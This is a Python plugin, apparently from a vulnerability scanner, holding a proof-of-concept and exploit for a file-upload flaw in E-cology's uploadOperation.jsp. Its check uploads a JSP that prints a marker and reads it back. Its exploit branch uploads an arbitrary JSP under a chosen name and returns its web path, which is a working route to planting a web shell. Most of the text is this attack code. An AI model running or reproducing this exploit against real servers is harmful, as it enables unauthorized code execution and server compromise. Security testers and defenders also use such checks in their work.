...
def vuln_info():
    info={
        'vuln_name': 'E-cology uploadOperation.jsp文件上传漏洞',  #漏洞名称
...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        ...
        status = requests.get(url + '/page/exportImport/uploadOperation.jsp',headers=heads,timeout=10,verify=False)

        if 200 == status.status_code:
            files = {
                'file': ('1w3r.jsp', "<%out.print(666);%>", 'application/octet-stream')
            }
            resp = requests.post(url + '/page/exportImport/uploadOperation.jsp',files=files,headers=heads,timeout=10,verify=False)
            getfile = requests.get(url + '/page/exportImport/fileTransfer/1w3r.jsp',headers=heads,timeout=10,verify=False)
            if '666' in getfile.text and getfile.status_code == 200:
                result['Result'] =True
                result['Result_Info']= "/page/exportImport/uploadOperation.jsp"
    ...
    try:
        ...
        if exp_data['type']=='uploadfile':
            ...
            if 200 == status.status_code:
                ...
                resp = requests.post(url + '/page/exportImport/uploadOperation.jsp', files=files, headers=heads,timeout=10, verify=False)
                getfile = requests.get(url + '/page/exportImport/fileTransfer/'+exp_data['filename']+'.jsp', headers=heads, timeout=10,verify=False)
                if getfile.status_code == 200:
                    result['Result'] = True
                    result['Result_Info'] = '上传成功\n上传路径为:'+url+'/page/exportImport/fileTransfer/'+exp_data['filename']+'.jsp'
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')
